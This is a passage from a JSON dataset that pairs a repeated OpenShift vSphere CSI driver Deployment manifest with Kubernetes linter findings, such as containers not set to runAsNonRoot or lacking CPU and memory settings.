${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"resizer-kube-rbac-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "8991",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vsphere-syncer\" is not set to runAsNonRoot"
  },
  {
    "id": "8992",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"vsphere-syncer\" has cpu request 0"
  },
  {
    "id": "8993",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"attacher-kube-rbac-proxy\" has memory limit 0"
  },
  {
    "id": "8994",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-attacher\" has memory limit 0"
  },
  {
    "id": "8995",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
